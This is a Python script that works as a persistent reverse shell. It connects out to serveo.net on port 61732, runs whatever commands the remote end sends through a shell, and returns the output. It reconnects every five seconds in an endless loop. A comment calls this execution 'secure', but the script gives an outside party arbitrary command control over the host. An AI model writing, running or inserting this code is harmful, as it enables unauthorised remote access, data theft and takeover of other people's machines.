import socket
import subprocess
import sys
import time
import threading
import os

ph = "serveo.net"  # Host address
po = 61732         # Port number (choose the same port provided on ssh command)
timeout = 60       # Timeout for the socket connection
delay = 5          # Delay before reconnect attempts

current_dir = os.getcwd()  # Keep track of the current working directory
input_thread_active = False      


def connect(host, port):
    #Connect to the remote server 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s


def handle_user_input(s):
    # Handle user input in a separate thread 
    global input_thread_active
    input_thread_active = True
    while input_thread_active:
        try:
            tri = input()  # Take input from the user
            if tri == "quit":
                s.close()
                sys.exit(0)
            s.send(tri.encode())
        except Exception as e:
            print(f"Error in input thread: {e}")
            break
    input_thread_active = False


def wait_for_command(s):
    # Wait for and execute commands from the server
    global current_dir 
    try:
        s.settimeout(timeout)  # Set socket timeout
        data = s.recv(1024).decode()  # Receive data
        if len(data) == 0:
            return True

        if data == "quit\n":
            s.close()
            sys.exit(0)
        
        # Handle `cd` command to change directory
        if data.startswith("cd "):
            new_dir = data[3:].strip()
            if os.path.isdir(new_dir):
                current_dir = new_dir
                result = f"Changed directory to {new_dir}\n"
            else:
                result = f"Directory {new_dir} does not exist\n"
            s.send(result.encode())
        else:
            # Run the command securely using subprocess
            proc = subprocess.Popen(data, shell=True, cwd=current_dir ,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)

            # Handle large outputs by sending in small sizes
            while True:
                output = proc.stdout.read(4096) + proc.stderr.read(4096)
                if not output:
                    break
                s.send(output)
        
        return False 

    except socket.timeout:
        print("Connection timed out.")
        return True 

    except Exception as e:
        print(f"Error: {e}")
        return True  


def main():
   # Main loop for connecting and handling communication
    global input_thread_active
    while True:
        socket_died = False
        try:
            s = connect(ph, po) 
            input_thread = threading.Thread(target=handle_user_input, args=(s,))
            input_thread.start()

            while not socket_died:
                socket_died = wait_for_command(s) 

            # Close the socket and terminate input thread if socket dies
            s.close()
            input_thread_active = False

        except socket.error as e:
            print(f"Socket error: {e}")

        time.sleep(delay)  


if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception as e:
            print(f"Exception in main loop: {e}")
            time.sleep(delay)
